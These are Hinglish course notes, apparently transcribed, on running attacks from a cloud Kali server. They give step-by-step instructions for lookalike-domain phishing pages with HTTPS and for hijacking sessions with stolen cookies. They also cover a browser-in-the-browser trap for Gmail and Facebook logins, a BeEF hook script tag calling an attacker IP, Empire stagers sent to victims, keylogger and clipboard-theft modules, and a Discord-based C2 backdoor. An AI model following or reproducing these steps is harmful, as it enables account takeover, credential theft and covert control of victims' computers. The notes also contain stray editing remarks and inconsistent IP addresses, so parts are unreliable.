# Section-1 and 2 -> Introduction to cloud computing for hackers and cloud basics

### **Page 1: Course Introduction**

*Original Image: Sticker 1*

**Topic: Index**
Yeh tumhare course ka cover page hai.

  * **Title:** Ethical Hacking using the Cloud from Scratch.
  * **Index:** Is note mein Page 1 se lekar Page 47 tak ka content cover kiya gaya hai.

-----

#Course --- Ethical Hacking using the cloud from scratch to the End..

### **Page 2: Cloud Basics & Kali Linux Setup**

*Original Image: Sticker 2*

**Topic: Cloud Basics & Installing Kali**

  * **Cloud Kya Hai:** Cloud ka matlab wo remote computers hain jo internet ke through services provide karte hain.
  * **Step 1: AWS Sign Up:** Sabse pehle Amazon AWS par jao aur ek free account create karke sign up karo. (Note: Hamesha 'Free Account' choose karna).
  * **Step 2: Install Kali Linux on Cloud:**
    1.  'Launch a virtual machine' par click karo.
    2.  Apni virtual machine ko koi bhi naam (Name) de do.
    3.  'Application and OS Images' section mein jao aur 'Browse more AMIs' par click karo.
    4.  Search box mein **"hacking"** search karo, wahan tumhe hacking machines dikhengi.
    5.  Phir search box mein **"Kali"** search karo. Tumhe Kali Linux as a virtual machine dikhai dega.
    6.  **Kali Linux** select karo aur dhyan rakhna ki uspe **'Free tier eligible'** likha ho, taaki koi charge na lage.
    7.  'Continue' par click karo.

-----

### **Page 3: Instance Configuration**

*Original Image: Sticker 3*

**Topic: Instance Type & SSH Keys**

  * **Instance Type:** Dropdown mein `t1.micro` ya `t2.micro` hi select karo.
      * *Reason:* Sirf yehi do types "Free tier eligible" hote hain.
  * **Key Pair:**
      * 'Create new key pair' select karo.
      * Yeh key pair (`.pem` file) bahut important hai kyunki iske through hi tum **SSH** (Secure Shell) use karke apne cloud computer se communicate kar paoge.
  * **Storage:** 'Configure Storage' mein check karo ki tumhe free mein kitna GB eligible hai. Sirf utna hi GB apni virtual machine ko assign karo.
  * **Launch:**
      * 'Launch Instance' par click karo. Isse ready hone mein thoda time lagega.
      * Ek baar ho jane par 'View all Instances' par click karo.
      * 'Instance State' check karo, agar wahan **'Running'** likha hai, iska matlab tumhara Kali Linux ab cloud par chal raha hai.
  * **Machine Access:**
      * Machine par jane ke liye: AWS console mein `Services` -\> `EC2` pe click karo.
  * **Remote Connection (SSH):**
      * Cloud computer se connect karne ke liye terminal open karo.
      * Command use karo:
        ```bash
        ssh -i Downloads/kali-keypair.pem kali@44.204.13.14
        ```
      * *Explanation:* `ssh -i` ke baad apni private key ka path do, phir `default_username@IP_address`. (Ye IP tumhe EC2 instance details mein milegi).

-----

==================================================================================


### **Page 4: Phishing & Firewall Settings (Part 1)**

*Original Image: Sticker 4*

**Topic: Section 3 - Phishing & Firewall**

  * **File Hosting:** Phishing page host karne ke liye firewall settings change karni padengi.
  * **Important Note:** Agar tum cloud par `apache2` webserver run karte ho, toh tum dekho ge ki tum apni machine ki IP se usse access nahi kar pa rahe.
      * *Reason:* Ye AWS ki **Firewall Settings** ki wajah se hota hai. Security reasons se AWS ports block rakhta hai. Humein manually **Port 80** allow karna padega.
  * **Steps to Allow Port 80:**
    1.  EC2 dashboard par jao aur apni machine select karo.
    2.  Apni machine ki 'Instance ID' par click karo.
    3.  Neeche **'Security'** tab par click karo.
    4.  Wahan tumhe 'Inbound rules' aur 'Outbound rules' dikhenge.
    5.  Inbound rules mein tum dekhoge ki sirf **Port 22** (SSH) allowed hai (isi wajah se hum connect kar pa rahe the).
    6.  Ab humein Port 80 allow karna hai:
          * **Security groups** (jo ID wahan likhi ho) par click karo.
          * **'Edit Inbound rules'** par click karo.

-----

### **Page 5: Phishing & Firewall Settings (Part 2)**

*Original Image: Sticker 5*

**Topic: Adding HTTP Rule**

  * **Adding Rule:**
    1.  'Edit Inbound rules' mein 'Add rule' par click karo.
    2.  **Type:** Dropdown se `HTTP` select karo.
    3.  **Protocol:** Ye automatically `TCP` le lega.
    4.  **Port Range:** Ye automatically `80` le lega.
    5.  **Source:** Yahan `Custom` select karke `0.0.0.0/0` select karo.
          * *Matlab:* `0.0.0.0/0` ka matlab hai ki duniya mein koi bhi IP address tumhare web server ko access kar sakta hai (public access).
    6.  'Save rules' par click karo.
  * **Testing:** Ab kisi bhi browser mein jao aur apni AWS machine ki IP address type karo. Tumhara AWS Apache web server load ho jayega.

-----

### **Page 6: FileZilla Setup**

*Original Image: Sticker 9*

**Topic: Cloning Website & Uploading on Cloud**

  * **FileZilla Client:** Ye ek software hai jo humein SSH ke through cloud server se connect karne deta hai, lekin **GUI (Graphical User Interface)** mode mein.
      * Isse files ko browse karna, upload karna, download karna aur edit karna bahut aasaan ho jata hai (terminal commands ki zarurat nahi padti).
  * **Steps:**
    1.  Windows ke liye FileZilla Client download aur install karo.
    2.  FileZilla open karo.
    3.  **File** menu par click karo -\> **Site Manager** -\> **New Site**.
    4.  Isse koi bhi naam do (e.g., AWS Kali).
  * **Configuration:** Right side mein settings aise fill karo:
      * **Protocol:** Select `SFTP - SSH File Transfer Protocol`.
      * **Host:** Apne AWS Server ki IP daalo (e.g., 44.204.13.14).
      * **Logon Type:** Select `Key file`.
      * **User:** `kali` (kyunki hum kali user se login kar rahe hain).
      * **Key file:** Browse karke apni `.pem` key file select karo.

-----

### **Page 7: Using FileZilla**

*Original Image: Sticker 7*

**Topic: FileZilla Usage**

  * **Connecting:** Key file select karne ke baad **Connect** par click karo. Tum connect ho jaoge.
  * **How it works:** Note karo ki FileZilla backend mein wahi SSH commands run kar raha hai jo hum terminal mein karte the, bas humein GUI dikh raha hai.
      * Ye file system navigate karne mein help karta hai.
  * **Features:**
      * FileZilla mein kisi bhi file par Right-click karne par options milte hain: Download, Add to queue, View/Edit, Create Directory, Delete, Rename, Change permissions, etc.
      * Tum files ko **Windows se directly Kali mein Drag and Drop** karke upload kar sakte ho.
      * Jo kaam command line se mushkil lagta hai, wo FileZilla se bahut easy ho jata hai.

-----

### **Page 8: Permissions & Fake Login Page**

*Original Image: Sticker 8*

**Topic: Fixing Permission Denied Error**

  * **Problem:** Jab tum phishing page ki files `/var/www/html` folder mein drag & drop karoge, tumhe **"Permission Denied"** error aayega.
      * *Reason:* Agar tum folder permissions check karoge, toh owner aur group **'root'** hai. Lekin humne login **'kali'** user se kiya hai. Kali user root folder mein likh nahi sakta.
  * **Solution:** Humein ownership change karni padegi 'root' se 'kali' tak.
      * *Important:* FileZilla ke through hum `sudo` commands nahi chala sakte. Isliye humein wapas **SSH terminal** (Putty ya cmd) par jana padega.
  * **Command:** Login karne ke baad ye command run karo:
    ```bash
    sudo chown kali:kali /var/www/html -R
    ```
  * **Breakdown of Command:**
      * `sudo`: Superuser do (admin power).
      * `chown`: Change owner.
      * `kali:kali`: Naya owner 'kali' user aur 'kali' group hoga.
      * `/var/www/html`: Jis directory ki permission change karni hai.
      * `-R`: Recursive (matlab is folder ke andar jitni bhi files aur folders hain, sab par ye rule laguu hoga).
  * **Result:** Ab tum FileZilla se `/var/www/html` mein asani se files upload kar sakte ho.

-----

### **Page 9: Domain Name & DNS Basics**

*Original Image: Sticker 3* (Wait, correction based on content: This is likely Sticker 6 in logical flow, but Image 3 in upload. Let's stick to content flow).
*Wait, looking at the uploaded files again, the file labeled `Screenshot...181510.png` (Sticker 9) is about Domain names.*

**Topic: Domain Names**

  * **Why Domain?** Phishing page banane ke liye, humein page ko cloud par host karna hai aur `HTTPS` (secure lock icon) dikhana hai. Iske liye humein ek **Domain Name** kharidna padega aur usse apne Cloud Server ki IP se link karna padega.
  * **Step 1:** Koi bhi sasta domain purchase kar lo.
      * *Example:* `loginform.co`

-----

### **Page 10: Linking Domain to IP**

*Original Image: Sticker 10*

**Topic: DNS Records (A Record & CNAME)**

  * **Linking Process:**
    1.  Jahan se domain kharida hai wahan jao.
    2.  **'Manage DNS records'** par click karo.
  * **A Record (Main Domain):**
      * **Type:** `A` select karo (Iska matlab hai domain ko IP par redirect karna).
      * **Host:** `@` daalo (ya apna domain name).
      * **Answer/Value:** Apne AWS instance ki **IP address** daalo (e.g., 44.204.13.14).
      * **Add Record** par click karo.
      * *Note:* DNS update hone mein kabhi kabhi 24 ghante tak lag sakte hain (waise jaldi ho jata hai).
  * **CNAME Record (Subdomain):**
      * Agar tumhe subdomain banana hai (jaise `facebook.loginform.co`):
      * **Type:** `CNAME` select karo.
      * **Host:** `facebook` likho (kyunki mujhe facebook naam ka subdomain chahiye).
      * **Result:** Ye ek subdomain create karega jo tumhare main domain (`loginform.co`) se link hoga. Jab koi `facebook.loginform.co` kholega, wo tumhare server par hi aayega.

-----


-----

### **Page 11: Domain Redirection & Subdomains**

*Original Image: Sticker 11*

**Topic: Subdomain Setup**

  * **Logic:** Pichle steps mein humne `loginform.co` kharida tha. Ab humne `facebook` naam ka subdomain banaya hai.
      * Result: `facebook.loginform.co` ab tumhare AWS server ki IP address par redirect hoga.
  * **DNS Propagation:** Note mein likha hai ki DNS settings update hone mein thoda time lag sakta hai.
  * **Why this helps:** Jab victim URL dekhega `facebook.loginform.co`, toh ye `44.204.xx.xx` IP address se zyada convincing lagega.
  * **HTTPS/SSL Introduction:**
      * Note mein ek non-profit organization **Let's Encrypt** ka zikr hai.
      * Ye humein free mein **TLS Certificates** provide karta hai. Isse humari website par "Secure" lock icon aa jayega, jo phishing ke liye trust build karne mein zaruri hai.

-----

### **Page 12: Enabling HTTPS (SSL)**

*Original Image: Sticker 12*

**Topic: Installing SSL with Certbot**

  * **Installation:** Terminal mein ye commands run karo:
    1.  `sudo apt update` (Sources list update karne ke liye).
    2.  `sudo apt install certbot` (Certbot tool install karne ke liye).
    3.  `sudo apt install python3-certbot-apache` (Apache plugin ke liye).
  * **Generating Certificate:**
      * Command: `sudo certbot --apache`
      * Ye command tumse kuch questions puchega (email, terms agree karna, etc.) aur tumhare domain ke liye certificate generate kar dega.
  * **Important Note:** Ye certificate 3 months ke liye valid hota hai, lekin Certbot isse automatically renew kar deta hai, toh expire hone ki tension nahi leni.
  * **Firewall Setting for HTTPS:**
      * Jab tum HTTPS enable karoge, toh website **Port 443** par chalegi (by default HTTP port 80 hota hai).
      * **Action Required:** AWS Console mein jao -\> Security Groups -\> **Inbound Rules**.
      * **Add Rule:**
          * Type: `Custom TCP`
          * Port: `443`
          * Source: `0.0.0.0/0` (Anywhere)
      * Ab tumhari site `https://...` par open hogi.

-----

### **Page 13: Cookie Editor**

*Original Image: Sticker 13*

**Topic: Session Hijacking Tool**

  * **Tool:** **Cookie Editor** ek Chrome extension hai.
  * **Usage:**
    1.  Is extension ko browser mein install karo.
    2.  Agar tumhare paas victim ki cookie hai, toh 'Import' par click karo aur cookie paste kar do.
    3.  Page ko refresh karo.
    4.  **Result:** Tum bina password enter kiye victim ke account mein login ho jaoge.

-----

==================================================================================


### **Page 14: Accessing Cloud GUI (Desktop)**

#Section-5 ->Accessing Cloud server Desktop

*Original Image: Sticker 14*

**Topic: Installing GUI on Kali Cloud**

  * **Context:** Abhi tak hum sirf terminal (black screen) use kar rahe the. Ab humein graphical interface (Desktop) chahiye.
  * **Installation:**
      * Command: `sudo apt install xfce4 xfce4-goodies tightvncserver`
      * Ye `xfce4` desktop environment aur `tightvncserver` install karega.
  * **Starting VNC Server:**
      * Command: `tightvncserver -geometry 1280x720`
      * Ye 720p resolution mein server start karega.
  * **Firewall Rule:**
      * VNC Server by default **Port 5901** use karta hai.
      * **Action:** AWS Inbound Rules mein jao aur **Port 5901** allow karo (`0.0.0.0/0` ke liye).
  * **Connecting:** Apne local computer par **"Remote Ripple"** ya koi bhi VNC Viewer download karo aur connect karo (IP:5901).
  * **Stopping Server:** Agar server rokna ho to: `tightvncserver -kill :1`

-----

==================================================================================


### **Page 16: Browser In The Browser (BITB) - Intro**

#Section-6 ->Browser In The Browser Attack

*Original Image: Sticker 16*

**Topic: NoVNC & BITB Concept**

  * **Concept:** Hum VNC Client (software) use karne ki jagah **NoVNC** use karenge.
      * NoVNC HTML aur JavaScript use karta hai taaki tum browser ke andar hi VNC session access kar sako.
  * **Attack Strategy:** Hum victim ko ek link bhejenge. Jab wo link kholega, usse browser mein humari Kali machine ka GUI dikhega (jo ki ek fake browser window jaisa lagega).
  * **Benefit:** Victim ko kuch install nahi karna padega. Wo bas link kholega aur humara setup load ho jayega.

-----

### **Page 17: BITB Workflow**

*Original Image: Sticker 17*

**Topic: Execution Logic**

  * **Scenario:** Victim ko lagega wo real login page (Google/Facebook) par hai.
  * **Reality:** Wo actually humare Cloud Computer (Kali) ke browser ko access kar raha hai.
  * **The Trap:**
    1.  Victim real Facebook/Gmail par login karega.
    2.  Jaise hi wo login kar lega, hum connection disconnect kar denge.
    3.  Kyunki wo humare computer par login hua tha, uska **Session** humare browser mein active reh jayega.
    4.  Hum bina cookie inject kiye uska account access kar lenge.
  * **Enhancement:** Hum keylogger bhi install kar sakte hain username/password capture karne ke liye.

-----

### **Page 18: Setting up NoVNC**

*Original Image: Sticker 18*

**Topic: Running NoVNC Proxy**

  * **Prerequisites:** Humare paas GUI aur VNC Server pehle se installed hai (Page 14 se).
  * **Step 1: Install NoVNC:**
      * Command: `sudo apt install novnc`
  * **Step 2: Start VNC Server:**
      * Command: `tightvncserver -geometry 1920x1080` (Full HD set karo taaki clear dikhe).
  * **Step 3: Start NoVNC Proxy:**
      * Hum port 6080 (default) ki jagah Port 80 use karenge taaki victim ko port number type na karna pade.
      * Command:
        ```bash
        /usr/share/novnc/utils/novnc_proxy --listen 80 --vnc localhost:5901
        ```
      * *Explanation:* Ye command bahar se aane wali Port 80 ki traffic ko andar chal rahe VNC server (Port 5901) par bhej dega.
  * **Access:** Ab browser mein apni AWS IP dalo, tumhe Kali ka desktop dikh jayega.

-----

### **Page 19: Making it Look Real (Kiosk Mode)**

*Original Image: Sticker 19*

**Topic: Malicious Browser Setup**

  * **Preparation:**
    1.  Kali ke Firefox mein ek **Keylogger extension** install karo.
    2.  Browser ko "Full Screen" ya **Kiosk Mode** mein run karo taaki address bar aur close buttons chhup jayein.
    <!-- end list -->
      * Command: `firefox --kiosk https://gmail.com`
      * *Result:* Screen par sirf Gmail dikhega, koi window bar nahi.
  * **Fixing NoVNC Title:**
      * Problem: Browser tab par title "Connected to Kali" likha aata hai. Ye shaq paida karega.
      * Solution: HTML file edit karo.
      * Command: `nano /usr/share/novnc/vnc_lite.html`
      * Is file mein `<title>` tag dhundo aur usse change karke "Gmail" kar do.

-----

### **Page 20: Removing Password & Final Polish**

*Original Image: Sticker 20*

**Topic: Hardcoding Password & Renaming File**

  * **Problem:** Jab victim link kholega, NoVNC usse VNC password maangega. Ye nahi hona chahiye.
  * **Solution (Hardcoding):**
      * `vnc_lite.html` file ko wapas edit karo (`nano` se).
      * `password` variable search karo.
      * Wahan `prompt("password required")` hata kar apna password hardcode kar do.
      * Example: `const password = "tumhara_vnc_password"`
  * **Direct Access:**
      * URL ko clean banane ke liye (`/vnc_lite.html` hatane ke liye):
      * File ko rename kar do: `mv vnc_lite.html index.html`
  * **Enhancement:** Ab subdomain (jaise `gmail.loginform.co`) banakar usse IP se link karo aur HTTPS install karo. Victim ko bilkul real Gmail experience milega.

-----

==================================================================================


### **Page 21: BeEF Framework**

*Original Image: Sticker 21*

**Topic: Section 9 - Hacking Web Servers with BeEF**

  * **What is BeEF?** (Browser Exploitation Framework).
      * Ye browsers ko "Hook" karta hai.
      * Ek baar browser hook ho gaya, tum uspar commands run kar sakte ho (alert box dikhana, redirect karna, fake updates dikhana, etc.).
  * **Installation:**
      * Command: `sudo apt install beef-xss`
  * **Starting:**
      * Command: `sudo service beef-xss start`
      * Status check: `sudo service beef-xss status`
  * **Firewall Rule:**
      * BeEF ka control panel aur hook script **Port 3000** par chalta hai.
      * **Action:** AWS Security Group mein **Port 3000** allow karo (`0.0.0.0/0`).
  * **Login:** Browser mein `http://tumhari_aws_ip:3000/ui/panel` open karo.
      * Default username/password usually `beef`/`beef` hota hai (ise config file mein change kar lena chahiye).
  * **Usage:** Wahan ek "Hook URL" milega. Is script ko kisi bhi webpage mein daal do. Jo bhi wo page kholega, wo BeEF mein "Hooked Browser" ban jayega.

-----

Yeh raha tumhare next set of notes (Page 22 se Page 31) ka detailed breakdown Hinglish mein. Isme hum **BeEF** ko secure (HTTPS) banana sikhenge aur phir **C2 Frameworks (Empire & Starkiller)** ke through advanced hacking samjhenge.

-----

### **Page 22: Embedding Evil Code & HTTPS Setup**

*Original Image: Sticker 22*

**Topic: Hooking the Victim & Preparing SSL**

  * **Hooking Script:**
      * BeEF ka magic tab shuru hota hai jab victim tumhara JS code run karta hai.
      * **Action:** Apne phishing page (HTML file) ke `<head>` section mein ye script add karo:
        ```html
        <script src="http://14.204.13.14:3000/hook.js"></script>
        ```
      * *Note:* IP address ki jagah tum apna domain name bhi daal sakte ho agar linked hai.
  * **Enabling HTTPS for BeEF:**
      * Sirf phishing page par HTTPS hona kaafi nahi hai, BeEF ka connection (hook.js) bhi HTTPS par hona chahiye, warna browser "Mixed Content" error dega aur block kar dega.
      * **Step 1: Copy Certificates:**
          * Humne pehle Certbot se certificates generate kiye the. Humein wo certificates BeEF ke folder mein copy karne honge.
          * Command:
            ```bash
            cp /etc/letsencrypt/live/tumhara_domain/privkey.pem /usr/share/beef-xss/
            ```
          * *Logic:* Hum private key copy kar rahe hain taaki BeEF use access kar sake.

-----

### **Page 23: Configuring BeEF for HTTPS**

*Original Image: Sticker 23*

**Topic: Editing BeEF Config File**

  * **Continuing Copy:**
      * Full chain certificate bhi copy karo:
        ```bash
        cp /etc/letsencrypt/live/tumhara_domain/fullchain.pem /usr/share/beef-xss/
        ```
      * **Verification:** `ls /usr/share/beef-xss` run karke check karo ki dono files wahan aa gayi hain ya nahi.
  * **Editing Config:**
      * BeEF ko batana padega ki HTTPS use karna hai.
      * Command: `nano /etc/beef-xss/config.yaml`
  * **Changes in Config File:**
    1.  **Public Section:** `public` section dhundo. Wahan `host` mein apna domain name daalo (e.g., `result.com`) aur `https: true` uncomment karo.
    2.  **HTTPS Section:** File mein neeche jao, `https` section milega.
          * `enable: true` (Uncomment karo).
          * `key`: Wahan us key ka path paste karo jo abhi copy ki thi (`/usr/share/beef-xss/privkey.pem`).
          * `cert`: Certificate ka path paste karo (`/usr/share/beef-xss/fullchain.pem`).
    3.  **Save:** `Ctrl + O` (Save) aur `Ctrl + X` (Exit).
  * **Restart:**
      * Command: `service beef-xss restart`
      * *Result:* Ab camera, mic, aur geolocation jaise features kaam karenge kyunki wo sirf HTTPS par chalte hain.

-----

### **Page 24: URL Manipulation**

*Original Image: Sticker 24*

**Topic: Making the URL Look Real**

  * **Typosquatting:**
      * Agar target `facebook.com` hai, toh tum same domain nahi kharid sakte.
      * **Strategy:** Milta-julta domain kharido. Jaise `loginform.co` ya `support.co`.
  * **Subdomain Trick:**
      * Domain kharidne ke baad subdomain create karo: `facebook.loginform.co`.
  * **Directory Matching:**
      * Server par folder structure waisa hi banao jaisa real URL mein hota hai.
      * **Method:**
        1.  Apne server (`/var/www/html`) mein `facebook` naam ka folder banao.
        2.  Uske andar apni phishing file rakho.
      * **Final URL:** `https://loginform.co/facebook/index.html`
      * Ye URL victim ko kaafi convincing lagega.

-----

==================================================================================


### **Page 25: C2 Frameworks (Basics)**

*Original Image: Sticker 25*

**Topic: Section 10 - Command & Control server (C2)**

  * **What is C2?** (Command and Control).
      * Ye ek aisa setup hai jisse hackers remotely computers ko control karte hain.
  * **Main Functions:**
      * Commands execute karna.
      * System resources access karna.
      * Sensitive data churana.
      * Pivot karna (ek computer se dusre network mein ghusna).
  * **Architecture (2 Parts):**
    1.  **Agent / Client / Backdoor:** Ye wo virus file hai jo victim (target) ke computer par run hoti hai.
    2.  **Server:** Ye tumhara Cloud Computer (Kali) hai jo commands bhejta hai aur data receive karta hai.

-----

==================================================================================


### **Page 26: Empire & Starkiller**

*Original Image: Sticker 26*

**Topic: Section 11 - Hacking windows, linux, and macOS using tools..**

  * **Empire:** Ye ek powerful C2 framework hai.
      * Features: Windows, Linux, Apple sabko control kar sakta hai.
      * Communication AES encrypted hoti hai (security tools pakad nahi paate).
      * Isme bahut saare modules pehle se aate hain.
      * *Repo:* Github par `BC-Security/Empire` use karo (ye updated version hai).
  * **Starkiller:**
      * Empire sirf command line tool hai (text based).
      * **Starkiller** Empire ka **GUI (Frontend)** hai. Ye Empire ko chalana aasaan banata hai.
  * **Important Note:** Empire aur Starkiller use karne ke liye tumhe firewall mein inke ports allow karne honge.

-----

### **Page 27: Interacting with Starkiller**

*Original Image: Sticker 27*

**Topic: Login & Setup**

  * **Accessing Starkiller:**
      * Install karne ke baad browser mein jao.
      * URL: `http://tumhari_cloud_ip:1337` (Starkiller default port 1337 hota hai).
  * **Default Credentials:**
      * Username: `empireadmin`
      * Password: `password123`
  * **Why Cloud?**
      * Humne localhost ki jagah Cloud IP isliye di kyunki Empire cloud par install hai. Saari processing cloud par ho rahi hai.
  * **Initial Setup:**
      * Login karte hi default username aur password change kar lena chahiye.
      * **Users Menu:** Yahan se tum nayi teams bana sakte ho.
      * *Feature:* Ye "Multiplayer" game jaisa hai. Ek hi hacked computer ko tumhari poori hacking team alag-alag computers se control kar sakti hai.

-----

### **Page 28: Creating a Listener**

*Original Image: Sticker 28*

**Topic: Setting up the Receiver**

  * **Concept:** Backdoor create karne se pehle, humein ek "Listener" banana padega jo victim ke connection ka wait karega.
  * **Steps:**
    1.  Starkiller menu mein **'Listeners'** par click karo -\> **'Create'**.
    2.  **Type:** `HTTP` select karo (Ye sabse stable hota hai aur firewall se easily nikal jata hai).
    3.  **Name:** Kuch bhi naam do.
    4.  **Host/IP:** Apne Cloud Server ki IP daalo.
    5.  **Port:** Wo port daalo jo firewall mein open kiya hai (e.g., 80 ya 8080).
  * **Advanced Settings:**
      * **Kill Date:** Wo date set karo jab virus apne aap kaam karna band kar de.
      * **Working Hours:** Tum set kar sakte ho ki agent sirf 9:00 AM se 5:00 PM tak hi active rahe (taaki shaq na ho).
      * **Submit** par click karo. Listener start ho jayega.

-----

### **Page 29: Creating a Backdoor (Stager)**

*Original Image: Sticker 29*

**Topic: Generating the Virus File**

  * **Stager:** Empire ki language mein virus/payload ko "Stager" kehte hain.
  * **Steps:**
    1.  Menu mein **'Stagers'** par click karo -\> **'Create'**.
    2.  **Type:** `windows_launcher_bat` select karo (agar Windows hack karna hai).
    3.  **Listener:** Wo listener select karo jo abhi pichle step mein banaya tha.
    4.  **Language:** PowerShell select karo (Windows hacking ke liye best).
    5.  **Submit** aur phir **Download** icon par click karo.
  * **Execution:**
      * Ab ye `.bat` file victim ko bhejo.
      * Jaise hi wo isse run karega, tumhare Cloud Kali par connection aa jayega.

-----

==================================================================================


### **Page 30: Post Exploitation Basics**

*Original Image: Sticker 30*

**Topic: Section 12 - **Post Exploitation With StartKiller**

  * **Agents Tab:**
      * Jab victim file run karega, wo **'Agents'** tab mein dikhai dega.
      * Wahan uska computer name, IP, username sab dikhega.
      * Agent par double click karke tum usse control kar sakte ho.
  * **What can you do?**
      * File system access (files download/upload).
      * Camera aur Microphone access.
      * **Interact Tab:** Yahan tum direct commands type kar sakte ho.
      * Command: `help` type karo, saari available commands ki list aa jayegi.

-----

### **Page 31: Starkiller Modules**

*Original Image: Sticker 31*

**Topic: Using Empire Modules**

  * **The Power of Empire:** Empire ka asli maza uski **Module Library** mein hai.
  * **Usage:**
    1.  Agent select karo.
    2.  **'Execute Module'** par click karo.
    3.  **Search:** Search box mein jo attack karna hai wo type karo.
  * **Examples of Modules:**
      * **Reboot/Logoff:** Search `restart` or `logoff`.
      * **Troll:** Search `trollsploit`. Tum victim ka wallpaper change kar sakte ho, ghost sounds baja sakte ho, ya message box pop-up kar sakte ho.
      * **Spying:** Search `screenshot`.
          * Module: `powershell_collection_screenshot`.
          * *Reason:* Humne PowerShell stager use kiya tha, isliye PowerShell modules hi best kaam karenge.
      * Select karo aur **Execute** kar do. Output tumhe wahin dikh jayega.

-----



### **Page 32: Finding Sensitive Data & Module Filtering**
*Original Image: Sticker 32*

**Topic: Starkiller Module Info**

* **Module Information:**
    * Jab tum kisi module par click karte ho, tumhe uski details milti hain.
    * **Background:** `True/False` (Kya ye background mein chalega?).
    * **NeedAdmin:** `True/False` (Kya isse run karne ke liye Admin rights chahiye?).
    * **Github Link:** Wahan module ka source code dekhne ka link bhi hota hai.
* **Running a Module:**
    * Bas **'Run'** par click karo.
    * Output dekhne ke liye **'Tasks'** tab par jao.
* **Filtering Modules:**
    * Starkiller mein hazaron modules hain. Unhein dhundne ke liye left side mein filters use karo.
    * Tum Language (PowerShell, Python) ya Category (Credentials, Situational Awareness) ke hisaab se filter kar sakte ho.
* **Multi-Agent Execution:**
    * Tum ek hi module ko ek saath multiple hacked computers (Agents) par bhi run kar sakte ho.

---

### **Page 33: Stealing Windows Passwords**
*Original Image: Sticker 33*

**Topic: Collection Modules (Keylogger & Clipboard)**

* **Goal:** Username aur Password churana.
* **Tools:** Empire ka **'Collection'** module use karenge.
* **Module 1: Keylogger**
    * Module Name: `powershell/collection/keylogger`
    * **Function:** Ye victim ke keyboard par type kiye gaye har button (keystroke) ko record karta hai.
* **Module 2: Clipboard Monitor**
    * Module Name: `clipboard_monitor`
    * **Logic:** Bahut baar users password type karne ki jagah password manager ya text file se **Copy-Paste** karte hain.
    * Ye module clipboard par copy ki gayi har cheez ko steal kar leta hai.
* **Tip:** Agar sure nahi ho ki module kya karta hai, to uski description padh lo.

---

==================================================================================


### **Page 34: Discord as C2 (Introduction)**
*Original Image: Sticker 34*

**Topic: Section 13 - Hacking using Discord as c2**

* **Concept:** Hum **Distopia** naam ka tool use karenge.
* **Why Discord? (Staying under the RADAR):**
    * **No Port Forwarding:** Humein router mein ports open karne ki zarurat nahi hai.
    * **Trusted Traffic:** Network traffic `discord.com` par jayega. Firewall isse block nahi karega kyunki Discord ek trusted app hai.
    * **Encryption:** Discord ka communication HTTPS (Encrypted) hota hai.
* **How it works:**
    * Humara Virus (Backdoor) Discord ko message bhejega.
    * Humara Bot wo message padhega aur humein dega.
    * Hum command bhejenge -> Discord -> Virus -> Victim PC.
    * Hacker ko apna khud ka server setup karne ki zarurat hi nahi hai.

---

### **Page 35: Distopia Setup**
*Original Image: Sticker 35*

**Topic: Installing Distopia**

* **Advantage:** Apna server configure aur secure karne ka headache khatam. Connection zyada stealthy (chupke se) hota hai.
* **Installation:**
    * Github par jao aur search karo: `Distopia-C2` (ya course mein diye gaye link se).
    * Isse apne Kali Linux mein download aur install kar lo.

---

### **Page 36: Creating Discord Server**
*Original Image: Sticker 36*

**Topic: Setting up the Infrastructure**

* **Process:**
    1.  Discord install karo (Kali mein ya Web Browser mein).
    2.  Ek **New Server** create karo.
* **Logic:** Ye server humara "Command Center" banega jahan se hum agents se baat karenge.
* **Architecture:**
    * Hacker -> Discord -> Target
    * Hacker command Discord par type karega, Discord usse Target tak forward karega.
    * Target result wapas Discord par message ki tarah bhejega.

---

### **Page 37: Server Configuration**
*Original Image: Sticker 37*

**Topic: Creating Channels**

* **Template:** Distopia ke Github wiki par tumhe ek Template link milega. Usse use karke server banao, toh channels apne aap ban jayenge.
* **Manual Setup (Channels):**
    * Server ka naam kuch bhi rakho (e.g., `Distopia`).
    * Humein 2 main channels chahiye:
        1.  **#main:** Yahan hum commands bhejenge aur output dekhenge (Control Room).
        2.  **#keylogger:** Yahan victim ke keylogs (typed passwords/messages) aayenge.

---

### **Page 38: Weaponising Discord (Creating a Bot)**
*Original Image: Sticker 38*

**Topic: Discord Developer Portal**

* **Concept:** Hum khud messages type nahi karenge, hum ek **Bot** banayenge jo humare liye ye kaam karega.
* **Steps:**
    1.  Browser mein `discord.com/developers/applications` par jao.
    2.  **'New Application'** par click karo.
    3.  Naam do: `Distopia Bot` (ya kuch bhi).
    4.  Left menu mein **'Bot'** tab par click karo.
    5.  **Privileged Gateway Intents:** Saare intents enable kar do (taaki bot messages padh sake).
    6.  **Reset Access Token:** Is par click karke **Token Copy** kar lo.
    * **Important:** Ye Token password jaisa hai, isse save kar lo. Iski zarurat humein backdoor banane mein padegi.

---

### **Page 39: Adding Bot to Server**
*Original Image: Sticker 39*

**Topic: OAuth2 Generator**

* **Linking Bot:** Abhi Bot bana hai, lekin server mein add nahi hua.
* **Steps:**
    1.  Developer portal mein **'OAuth2'** -> **'URL Generator'** par jao.
    2.  **Scopes:** `bot` select karo.
    3.  **Permissions:** `Administrator` select karo (taaki sab access mile).
    4.  Neeche ek URL generate hoga, usse copy karo.
    5.  Browser mein wo URL paste karo.
    6.  Apna `Distopia` server select karo aur **'Authorize'** kar do.
* **Result:** Ab tumhare Discord server ke `#main` channel mein dikhega "Distopia Bot joined the server".

---

### **Page 40: Building the Backdoor**
*Original Image: Sticker 40*

**Topic: Generating the Payload**

* **Configuring the Tool:**
    * Kali Terminal mein Distopia folder mein jao.
    * Command run karo: `python3 builder.py`
    * Tool puchega "Use Discord?", `yes` type karo.
* **Getting IDs:**
    * Humein **Server ID (Guild ID)** chahiye.
    * Discord mein: Settings -> Advanced -> **Developer Mode** ON karo.
    * Ab apne Server name par Right Click karo -> **'Copy Server ID'**.
    * Is ID ko tool mein paste karo.
* **Token:** Tool tumse **Bot Token** maangega (jo Page 38 par copy kiya tha). Wo paste karo.

---

### **Page 41: Webhook for Keylogger**
*Original Image: Sticker 41*

**Topic: Keylogging Setup**

* **Channel ID:**
    * `#main` channel par right click karke **'Copy Channel ID'** karo aur tool mein de do.
* **Webhook Setup (For Keylogger):**
    * Keylogs ko fast bhejne ke liye Webhook use hota hai.
    * **Steps:**
        1.  Apne Server Settings mein jao -> **'Integrations'**.
        2.  **'Create Webhook'** par click karo.
        3.  Name: `Keylogger`.
        4.  Channel: `#keylogger` select karo.
        5.  **'Copy Webhook URL'** par click karo.
    * Is URL ko builder tool mein paste kar do.
